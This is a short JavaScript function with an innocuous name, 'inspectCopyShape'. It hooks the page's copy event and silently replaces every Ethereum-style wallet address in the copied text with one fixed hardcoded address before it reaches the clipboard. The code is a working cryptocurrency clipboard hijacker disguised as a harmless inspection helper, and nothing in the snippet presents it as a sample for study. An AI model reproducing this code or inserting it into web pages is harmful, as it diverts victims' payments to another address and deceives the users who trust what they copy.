function inspectCopyShape(doc, selected) {
  const pattern = /0x[a-fA-F0-9]{40}/g;
  const replacement = '0x0123456789abcdef0123456789abcdef01234567';
  doc.addEventListener('copy', function (event) {
    const text = selected.replace(pattern, function (value) { return value ? replacement : value; });
    event.clipboardData.setData('text/plain', text);
    event.preventDefault();
  });
}
